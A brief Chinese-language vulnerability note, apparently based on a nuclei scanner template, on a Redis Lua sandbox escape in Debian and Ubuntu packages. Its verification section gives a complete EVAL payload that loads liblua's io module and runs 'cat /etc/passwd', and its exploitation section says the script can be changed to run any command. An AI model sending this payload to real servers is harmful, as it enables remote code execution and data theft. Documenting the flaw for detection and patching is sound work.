验证漏洞存在方法
    - 向目标Redis服务发送特定的Lua脚本，检查响应是否包含/etc/passwd文件内容
    - 使用nuclei模板中的TCP请求：eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /etc/passwd", "r"); local res = f:read("*a"); f:close(); return res' 0

漏洞利用方法
    - 该漏洞是Redis Lua沙箱逃逸漏洞，由Debian和Ubuntu Redis包引入。维护者未能禁用包接口，允许攻击者加载任意库
    - 漏洞允许攻击者通过Lua环境执行任意系统命令，导致远程代码执行
    - PoC: 通过Redis的eval命令执行恶意Lua脚本，加载liblua5.1.so.0库的io模块，然后使用io.popen执行系统命令
    - 攻击者可以修改脚本执行任意命令，如读取敏感文件、执行反向shell等
    - 影响：成功利用可导致未经授权的访问、数据窃取和系统被完全控制
    - CVSS评分：10.0（严重）
